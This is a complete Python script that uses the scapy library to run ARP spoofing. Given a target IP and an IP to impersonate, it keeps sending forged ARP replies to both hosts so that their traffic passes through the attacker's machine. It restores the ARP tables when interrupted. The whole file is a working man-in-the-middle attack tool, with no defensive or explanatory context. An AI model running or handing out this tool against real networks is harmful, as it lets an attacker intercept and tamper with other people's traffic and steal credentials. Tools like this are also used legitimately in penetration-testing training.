import scapy.all as scapy
import time
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target_ip', help='Target IP', dest='target_ip')
    parser.add_argument('-s', '--spoof_ip', help='Spoofed IP', dest='spoof_ip')
    args = vars(parser.parse_args())
    return args


def get_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_arp_request = broadcast/arp_request
    answered = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(packet, verbose=False)


args = get_args()
count = 0
try:
    while True:
        spoof(args['target_ip'], args['spoof_ip'])
        spoof(args['spoof_ip'], args['target_ip'])
        count = count + 2
        print(f'\r[+] Packets sent: {count}', end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\nCTRL + C Detected. Restoring ARP Table...')
    restore(args['target_ip'], args['spoof_ip'])
    restore(args['spoof_ip'], args['target_ip'])
